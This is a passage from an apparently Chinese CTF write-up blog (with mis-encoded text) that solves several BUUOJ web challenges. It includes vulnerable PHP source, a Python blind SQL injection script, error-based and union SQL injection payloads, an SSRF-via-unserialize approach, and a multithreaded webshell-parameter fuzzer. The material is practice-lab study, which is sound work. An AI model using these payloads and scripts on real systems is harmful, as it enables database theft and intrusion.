ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbuser</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#è¢«è¿‡æ»¤çš„å†…å®¹ å‡½æ•°åŸºæœ¬æ²¡è¿‡æ»¤</span></span><br><span class="line">    <span class="variable">$blackList</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;||&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;limit&#x27;</span>,<span class="string">&#x27;update&#x27;</span>,<span class="string">&#x27;delete&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;load_file&#x27;</span>,<span class="string">&#x27;outfile&#x27;</span>,<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blackList</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$sql</span>,<span class="variable">$blackitem</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">&quot;ctf&quot;</span>,<span class="variable">$db</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(safe(<span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span> = mysql_query(<span class="string">&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$query</span>)&#123;</span><br><span class="line">        <span class="variable">$result</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$query</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;SQL Injection Checked.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯ä¸€ä¸ªtrick</p><p>1^1^1ï¼Œç”¨å®ƒå¯ä»¥èµ·åˆ°ä»£æ›¿orçš„ä½œç”¨ã€‚</p><p>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p><p>ä½†è¿˜æœ‰ä¸€äº›æ˜¯æ²¡æœ‰ç”¨å¼‚æˆ–ï¼Œç”¨çš„æ˜¯ifï¼Œå¯ifæœ‰å±€é™æ€§ï¼Œåœ¨idä¸ºæ•°å­—å‹æ—¶ï¼Œå¯ä»¥ç›´æ¥ select * from users where id=if(1=1,1,0)ï¼Œä½†å¦‚æœidå•å¼•å·å­—ç¬¦å‹æˆ–åŒå¼•å·å­—ç¬¦å‹ï¼Œé‚£å°±å¿…é¡»åœ¨ifå‰åŠ oræˆ–and</p><p>pythonè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f68906e-d306-4cb6-a19b-7055f59cddf5.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">33</span></span><br><span class="line">    top = <span class="number">130</span></span><br><span class="line">    mid = (low + top) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; top:</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i, mid)</span><br><span class="line">        html = requests.post(url, data=payload)</span><br><span class="line">        <span class="keyword">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> in html.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            top = mid</span><br><span class="line">        mid = (low + top) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> chr(mid) == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + chr(mid)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;flag: &quot;</span>, result)</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(database())))))%<span class="number">23</span> </span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select%<span class="number">20</span>database())),<span class="number">1</span>)%<span class="number">23</span> è·å¾—åº“åfakebook</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema)=%<span class="number">27</span>fakebook%<span class="number">27</span>)))%<span class="number">23</span>,<span class="number">1</span>)%<span class="number">23</span> ä¸ç”¨ç©ºæ ¼çš„ç‰ˆæœ¬ï¼Œè·å¾—è¡¨åusers</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,concat(%<span class="number">27</span>~%<span class="number">27</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)=%<span class="number">27</span>users%<span class="number">27</span>)))%<span class="number">23</span> è·å¾—å­—æ®µåno,username,passwd,data,USER,CU</span><br></pre></td></tr></table></figure><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">Â  Â  </span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">Â  Â  </span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="variable">$ch</span> = curl_init(); Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="comment">//åˆå§‹åŒ–ä¸€ä¸ªcurlä¼šè¯</span></span><br><span class="line">Â  Â  Â  Â  curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); Â  Â  Â  Â  Â  Â  Â  Â  <span class="comment">//è®¾ç½®éœ€è¦æŠ“å–çš„URL</span></span><br><span class="line">Â  Â  Â  Â  curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); Â  Â  Â  Â  <span class="comment">//è®¾ç½®cURL å‚æ•°ï¼Œè¦æ±‚ç»“æœä¿å­˜åˆ°å­—ç¬¦ä¸²ä¸­è¿˜æ˜¯è¾“å‡ºåˆ°å±å¹•ä¸Š</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>); Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="comment">//è¿è¡ŒcURLï¼Œè¯·æ±‚ç½‘é¡µ</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  curl_close(<span class="variable">$ch</span>); Â  Â  Â  Â  Â <span class="comment">//å…³é—­ä¸€ä¸ªcurlä¼šè¯ï¼Œå”¯ä¸€çš„å‚æ•°æ˜¯curl_init()å‡½æ•°è¿”å›çš„å¥æŸ„</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">Â  Â  </span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">Â  Â  </span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨ssrfå»è¯»æˆ‘ä»¬è¦çš„flagæ–‡ä»¶ï¼ŒåŒæ—¶åˆ©ç”¨åˆ°äº†ä¸Šé¢çš„noå‚æ•°çš„æ³¨å…¥</p><p>views.phpéƒ¨åˆ†ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;anti_sqli(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;getUserByNo(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$user</span>-&gt;getBlogContents();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="number">404</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = base64_encode(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%<span class="number">27</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(password)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">123</span></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT(database())),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema)like(database())),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name)like(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(password)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">username=<span class="number">44</span>&amp;password=<span class="number">1</span>%<span class="number">27</span>^extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(left(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1))))%<span class="number">23</span></span><br><span class="line">username=<span class="number">44</span>&amp;password=<span class="number">1</span>%<span class="number">27</span>^extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(right(password,<span class="number">30</span>))<span class="keyword">from</span>(geek.H4rDsq1))))%<span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>å¦‚æœæŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨çš„æ—¶å€™ï¼ŒunionæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚sqlçš„passwordä¼šmd5åŠ å¯†ï¼Œç„¶åæˆ‘ä»¬å°†æˆ‘ä»¬è‡ªå·±è¾“çš„å¯†ç ç¼–ç æˆmd5ç„¶åæ”¾å…¥ç¬¬ä¸‰åˆ—å½“ä¸­ã€‚åˆ—æ˜¯ä»€ä¹ˆå¯ä»¥ç”¨unionæ¥æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">202</span>cb962ac59075b964b07152d234b70<span class="string">&#x27; %23 &amp;pw=123</span></span><br></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>å¾ˆå¤šå†’å……çš„webshellçš„æ—¶å€™å¦‚ä½•æ‰¾åˆ°å¯ä»¥ä½¿ç”¨çš„ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;å¼€å§‹æ—¶é—´ï¼š  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)    <span class="comment">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span></span><br><span class="line">filePath = r<span class="string">&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#æ”¹å˜å½“å‰çš„è·¯å¾„</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span></span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span></span><br><span class="line">            gets = <span class="keyword">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="keyword">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#æ‰€æœ‰çš„$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#æ‰€æœ‰çš„$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m in gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n in posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span></span><br><span class="line">    req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:<span class="comment">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a in gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> in content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span>+file+<span class="string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> %param)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;ç»“æŸæ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in files:<span class="comment">#åŠ å…¥å¤šçº¿ç¨‹</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><h2 